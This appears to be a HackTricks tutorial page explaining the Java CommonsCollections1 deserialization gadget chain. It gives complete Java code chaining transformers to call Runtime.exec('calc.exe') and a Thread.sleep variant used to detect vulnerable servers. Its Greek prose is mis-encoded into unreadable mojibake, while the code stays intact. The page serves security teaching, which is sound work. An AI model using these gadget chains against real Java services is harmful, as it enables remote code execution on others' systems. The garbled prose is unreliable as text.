# CommonsCollection1 Payload - Java Transformers to Rutime exec() and Thread Sleep

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Java Transformers to Rutime exec()

Î£Îµ Î±ÏÎºÎµÏ„Î­Ï‚ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î± payload Î±Ï€Î¿ deserialization java Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ transformers Î±Ï€ÏŒ Ï„Î¹Ï‚ Apache common collections ÏŒÏ€Ï‰Ï‚ Ï„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰:
```java
import org.apache.commons.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.*;
import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.util.Map;
import java.util.HashMap;

public class CommonsCollections1PayloadOnly {
public static void main(String... args) {
String[] command = {"calc.exe"};
final Transformer[] transformers = new Transformer[]{
new ConstantTransformer(Runtime.class), //(1)
new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", new Class[0]}
), //(2)
new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
), //(3)
new InvokerTransformer("exec",
new Class[]{String.class},
command
) //(4)
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);

//Execute gadgets
lazyMap.get("anything");
}
}
```
Î‘Î½ Î´ÎµÎ½ Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ Ï„Î¯Ï€Î¿Ï„Î± Î³Î¹Î± Ï„Î± java deserialization payloads, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ Î´ÏÏƒÎºÎ¿Î»Î¿ Î½Î± ÎºÎ±Ï„Î±Î»Î¬Î²ÎµÏ„Îµ Î³Î¹Î±Ï„Î¯ Î±Ï…Ï„ÏŒÏ‚ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Î¸Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î­Î½Î± calc.

Î ÏÏÏ„Î± Î±Ï€' ÏŒÎ»Î±, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ ÏŒÏ„Î¹ Î­Î½Î±Ï‚ **Transformer ÏƒÏ„Î·Î½ Java** ÎµÎ¯Î½Î±Î¹ ÎºÎ¬Ï„Î¹ Ï€Î¿Ï… **Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Î¼Î¹Î± ÎºÎ»Î¬ÏƒÎ·** ÎºÎ±Î¹ **Ï„Î·Î½ Î¼ÎµÏ„Î±Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÎµ Î¼Î¹Î± Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ®**.\
Î•Ï€Î¯ÏƒÎ·Ï‚, ÎµÎ¯Î½Î±Î¹ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ ÏŒÏ„Î¹ Ï„Î¿ **payload** Ï€Î¿Ï… **ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹** ÎµÎ´Ï ÎµÎ¯Î½Î±Î¹ **Î¹ÏƒÎ¿Î´ÏÎ½Î±Î¼Î¿** Î¼Îµ:
```java
Runtime.getRuntime().exec(new String[]{"calc.exe"});
```
Î‰ **Ï€Î¹Î¿ Î±ÎºÏÎ¹Î²ÏÏ‚**, Î±Ï…Ï„ÏŒ Ï€Î¿Ï… Î¸Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ ÏƒÏ„Î¿ Ï„Î­Î»Î¿Ï‚ Î¸Î± ÎµÎ¯Î½Î±Î¹:
```java
((Runtime) (Runtime.class.getMethod("getRuntime").invoke(null))).exec(new String[]{"calc.exe"});
```
### Î ÏÏ‚

Î›Î¿Î¹Ï€ÏŒÎ½, Ï€ÏÏ‚ ÎµÎ¯Î½Î±Î¹ Ï„Î¿ Ï€ÏÏÏ„Î¿ payload Ï€Î¿Ï… Ï€Î±ÏÎ¿Ï…ÏƒÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î¹ÏƒÎ¿Î´ÏÎ½Î±Î¼Î¿ Î¼Îµ Î±Ï…Ï„Î¬ Ï„Î± "Î±Ï€Î»Î¬" one-liners;

**Î ÏÏÏ„Î¿Î½**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€Î±ÏÎ±Ï„Î·ÏÎ®ÏƒÎµÏ„Îµ ÏƒÏ„Î¿ payload ÏŒÏ„Î¹ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Î±Î¹ Î¼Î¹Î± **Î±Î»Ï…ÏƒÎ¯Î´Î± (Ï€Î¯Î½Î±ÎºÎ±Ï‚) Î¼ÎµÏ„Î±ÏƒÏ‡Î·Î¼Î±Ï„Î¹ÏƒÎ¼ÏÎ½**:
```java
String[] command = {"calc.exe"};
final Transformer[] transformers = new Transformer[]{
//(1) - Get gadget Class (from Runtime class)
new ConstantTransformer(Runtime.class),

//(2) - Call from gadget Class (from Runtime class) the function "getMetod" to obtain "getRuntime"
new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", new Class[0]}
),

//(3) - Call from (Runtime) Class.getMethod("getRuntime") to obtain a Runtime oject
new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
),

//(4) - Use the Runtime object to call exec with arbitrary commands
new InvokerTransformer("exec",
new Class[]{String.class},
command
)
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```
Î‘Î½ Î´Î¹Î±Î²Î¬ÏƒÎµÏ„Îµ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Î¸Î± Ï€Î±ÏÎ±Ï„Î·ÏÎ®ÏƒÎµÏ„Îµ ÏŒÏ„Î¹ Î±Î½ Î¼Îµ ÎºÎ¬Ï€Î¿Î¹Î¿Î½ Ï„ÏÏŒÏ€Î¿ Î±Î»Ï…ÏƒÏƒÎ¿Î´Î­ÏƒÎµÏ„Îµ Ï„Î· Î¼ÎµÏ„Î±Ï„ÏÎ¿Ï€Î® Ï„Î¿Ï… Ï€Î¯Î½Î±ÎºÎ± Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î±Ï…Î¸Î±Î¯ÏÎµÏ„ÎµÏ‚ ÎµÎ½Ï„Î¿Î»Î­Ï‚.

Î›Î¿Î¹Ï€ÏŒÎ½, **Ï€ÏÏ‚ Î±Î»Ï…ÏƒÏƒÎ¿Î´Î­Î½Î¿Î½Ï„Î±Î¹ Î±Ï…Ï„Î­Ï‚ Î¿Î¹ Î¼ÎµÏ„Î±Ï„ÏÎ¿Ï€Î­Ï‚;**
```java
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);
lazyMap.get("anything");
```
Î£Ï„Î·Î½ Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Î± ÎµÎ½ÏŒÏ„Î·Ï„Î± Ï„Î¿Ï… payload Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Î­Î½Î± **Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Map Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Î±Î¹**. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· `decorate` ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ `LazyMap` Î¼Îµ Ï„Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ map ÎºÎ±Î¹ Ï„Î¿Ï…Ï‚ Î±Î»Ï…ÏƒÎ¹Î´Ï‰Ï„Î¿ÏÏ‚ Î¼ÎµÏ„Î±ÏƒÏ‡Î·Î¼Î±Ï„Î¹ÏƒÏ„Î­Ï‚. Î‘Ï€ÏŒ Ï„Î¿Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎºÏÎ´Î¹ÎºÎ± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Î±Ï…Ï„ÏŒ Î¸Î± Ï€ÏÎ¿ÎºÎ±Î»Î­ÏƒÎµÎ¹ Ï„Î·Î½ **Î±Î½Ï„Î¹Î³ÏÎ±Ï†Î® Ï„Ï‰Î½ Î±Î»Ï…ÏƒÎ¹Î´Ï‰Ï„ÏÎ½ Î¼ÎµÏ„Î±ÏƒÏ‡Î·Î¼Î±Ï„Î¹ÏƒÏ„ÏÎ½** Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ `lazyMap.factory`:
```java
protected LazyMap(Map map, Transformer factory) {
super(map);
if (factory == null) {
throw new IllegalArgumentException("Factory must not be null");
}
this.factory = factory;
}
```
ÎšÎ±Î¹ Ï„ÏŒÏ„Îµ ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î¿ Î¼ÎµÎ³Î¬Î»Î¿Ï‚ Ï„ÎµÎ»Î¹ÎºÏŒÏ‚: `lazyMap.get("anything");`

Î‘Ï…Ï„ÏŒÏ‚ ÎµÎ¯Î½Î±Î¹ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ `get`:
```java
public Object get(Object key) {
if (map.containsKey(key) == false) {
Object value = factory.transform(key);
map.put(key, value);
return value;
}
return map.get(key);
}
```
ÎšÎ±Î¹ Î±Ï…Ï„ÏŒÏ‚ ÎµÎ¯Î½Î±Î¹ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ `transform`
```java
public Object transform(Object object) {
for (int i = 0; i < iTransformers.length; i++) {
object = iTransformers[i].transform(object);
}
return object;
}
```
ÎˆÏ„ÏƒÎ¹, Î¸Ï…Î¼Î·Î¸ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ **factory** ÎµÎ¯Ï‡Î±Î¼Îµ Î±Ï€Î¿Î¸Î·ÎºÎµÏÏƒÎµÎ¹ **`chainedTransformer`** ÎºÎ±Î¹ Î¼Î­ÏƒÎ± ÏƒÏ„Î· **`transform`** ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· **Ï€ÎµÏÎ½Î¬Î¼Îµ Î±Ï€ÏŒ ÏŒÎ»Î¿Ï…Ï‚ Î±Ï…Ï„Î¿ÏÏ‚ Ï„Î¿Ï…Ï‚ Î±Î»Ï…ÏƒÎ¯Î´Ï‰Ï„Î¿Ï…Ï‚ Î¼ÎµÏ„Î±ÏƒÏ‡Î·Î¼Î±Ï„Î¹ÏƒÏ„Î­Ï‚** ÎºÎ±Î¹ ÎµÎºÏ„ÎµÎ»Î¿ÏÎ¼Îµ Î¿ Î­Î½Î±Ï‚ Î¼ÎµÏ„Î¬ Ï„Î¿Î½ Î¬Î»Î»Î¿. Î¤Î¿ Î±ÏƒÏ„ÎµÎ¯Î¿ ÎµÎ¯Î½Î±Î¹ ÏŒÏ„Î¹ **ÎºÎ¬Î¸Îµ Î¼ÎµÏ„Î±ÏƒÏ‡Î·Î¼Î±Ï„Î¹ÏƒÏ„Î®Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ `object`** **Ï‰Ï‚ ÎµÎ¯ÏƒÎ¿Î´Î¿** ÎºÎ±Î¹ **Ï„Î¿ object ÎµÎ¯Î½Î±Î¹ Î· Î­Î¾Î¿Î´Î¿Ï‚ Î±Ï€ÏŒ Ï„Î¿Î½ Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Î¿ Î¼ÎµÏ„Î±ÏƒÏ‡Î·Î¼Î±Ï„Î¹ÏƒÏ„Î® Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»Î­ÏƒÏ„Î·ÎºÎµ**. Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, **ÏŒÎ»Î¿Î¹ Î¿Î¹ Î¼ÎµÏ„Î±ÏƒÏ‡Î·Î¼Î±Ï„Î¹ÏƒÎ¼Î¿Î¯ ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ Î±Î»Ï…ÏƒÎ¯Î´Ï‰Ï„Î± ÎµÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚ Ï„Î¿ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ payload**.

### Î ÎµÏÎ¯Î»Î·ÏˆÎ·

Î£Ï„Î¿ Ï„Î­Î»Î¿Ï‚, Î»ÏŒÎ³Ï‰ Ï„Î¿Ï… Ï€ÏÏ‚ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Ï„Î¿ lazyMap Ï„Î¿Ï…Ï‚ Î±Î»Ï…ÏƒÎ¯Î´Ï‰Ï„Î¿Ï…Ï‚ Î¼ÎµÏ„Î±ÏƒÏ‡Î·Î¼Î±Ï„Î¹ÏƒÏ„Î­Ï‚ Î¼Î­ÏƒÎ± ÏƒÏ„Î· Î¼Î­Î¸Î¿Î´Î¿ get, ÎµÎ¯Î½Î±Î¹ ÏƒÎ±Î½ Î½Î± ÎµÎºÏ„ÎµÎ»Î¿ÏÎ¼Îµ Ï„Î¿Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎºÏÎ´Î¹ÎºÎ±:
```java
Object value = "someting";

value = new ConstantTransformer(Runtime.class).transform(value); //(1)

value = new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", null}
).transform(value); //(2)

value = new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
).transform(value); //(3)

value = new InvokerTransformer("exec",
new Class[]{String.class},
command
).transform(value); //(4)
```
_Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ Ï€ÏÏ‚ Ï„Î¿ `value` ÎµÎ¯Î½Î±Î¹ Î· ÎµÎ¯ÏƒÎ¿Î´Î¿Ï‚ ÎºÎ¬Î¸Îµ Î¼ÎµÏ„Î±ÏƒÏ‡Î·Î¼Î±Ï„Î¹ÏƒÎ¼Î¿Ï ÎºÎ±Î¹ Î· Î­Î¾Î¿Î´Î¿Ï‚ Ï„Î¿Ï… Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿Ï… Î¼ÎµÏ„Î±ÏƒÏ‡Î·Î¼Î±Ï„Î¹ÏƒÎ¼Î¿Ï, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÎ½ÏŒÏ‚ one-liner:_
```java
((Runtime) (Runtime.class.getMethod("getRuntime").invoke(null))).exec(new String[]{"calc.exe"});
```
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ ÎµÎ´Ï **ÎµÎ¾Î·Î³Î®Î¸Î·ÎºÎ±Î½ Ï„Î± gadgets** Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ Î³Î¹Î± Ï„Î¿ **ComonsCollections1** payload. Î‘Î»Î»Î¬ Î¼Î­Î½ÎµÎ¹ **Ï€ÏÏ‚ ÏŒÎ»Î± Î±Ï…Ï„Î¬ Î±ÏÏ‡Î¯Î¶Î¿Ï…Î½ Î½Î± ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹**. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ [ÎµÎ´Ï ÏŒÏ„Î¹ **ysoserial**](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java), Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î±Ï…Ï„ÏŒ Ï„Î¿ payload, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ `AnnotationInvocationHandler` ÎµÏ€ÎµÎ¹Î´Î® **ÏŒÏ„Î±Î½ Î±Ï…Ï„ÏŒ Ï„Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Î±Ï€Î¿Î´Î¿Î¼Î·Î¸ÎµÎ¯**, Î¸Î± **ÎºÎ±Î»Î­ÏƒÎµÎ¹** Ï„Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· `payload.get()` Ï€Î¿Ï… Î¸Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î¿Î»ÏŒÎºÎ»Î·ÏÎ¿ Ï„Î¿ payload**.

## Java Thread Sleep

Î‘Ï…Ï„ÏŒ Ï„Î¿ payload Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎ¯Î½Î±Î¹ **Ï‡ÏÎ®ÏƒÎ¹Î¼Î¿ Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÏƒÎ´Î¹Î¿ÏÎ¯ÏƒÎµÏ„Îµ Î±Î½ Ï„Î¿ web ÎµÎ¯Î½Î±Î¹ ÎµÏ…Î¬Î»Ï‰Ï„Î¿ ÎºÎ±Î¸ÏÏ‚ Î¸Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î­Î½Î±Î½ ÏÏ€Î½Î¿ Î±Î½ ÎµÎ¯Î½Î±Î¹**.
```java
import org.apache.commons.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.*;
import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Map;
import java.util.HashMap;

public class CommonsCollections1Sleep {
public static void main(String... args) {
final Transformer[] transformers = new Transformer[]{
new ConstantTransformer(Thread.class),
new InvokerTransformer("getMethod",
new Class[]{
String.class, Class[].class
},
new Object[]{
"sleep", new Class[]{Long.TYPE}
}),
new InvokerTransformer("invoke",
new Class[]{
Object.class, Object[].class
}, new Object[]
{
null, new Object[] {7000L}
}),
};

ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);

//Execute gadgets
lazyMap.get("anything");

}
}
```
## Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Gadgets

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± gadgets ÎµÎ´Ï: [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)

##

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
